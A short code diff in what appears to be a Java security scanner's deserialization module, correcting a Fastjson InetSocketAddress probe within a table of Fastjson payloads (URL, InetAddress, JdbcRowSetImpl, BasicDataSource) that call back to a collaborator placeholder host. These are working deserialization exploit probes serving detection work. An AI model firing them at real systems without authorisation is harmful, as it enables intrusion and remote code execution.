@@ -215,7 +215,7 @@ public class DeserializationScanner implements ScanModule {
             {"Fastjson URL",
                     "{\"@type\":\"java.net.URL\",\"val\":\"http://COLLAB_PLACEHOLDER/fastjson\"}"},
             {"Fastjson InetAddress",
-                    "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"http://COLLAB_PLACEHOLDER/fastjson2\"}}"},
+                    "{\"@type\":\"java.net.InetSocketAddress\",\"address\":{\"@type\":\"java.net.InetAddress\",\"val\":\"COLLAB_PLACEHOLDER\"}}"},
             {"Fastjson JdbcRowSetImpl HTTP",
                     "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"http://COLLAB_PLACEHOLDER/fastjson3\",\"autoCommit\":true}"},
             {"Fastjson BasicDataSource HTTP",
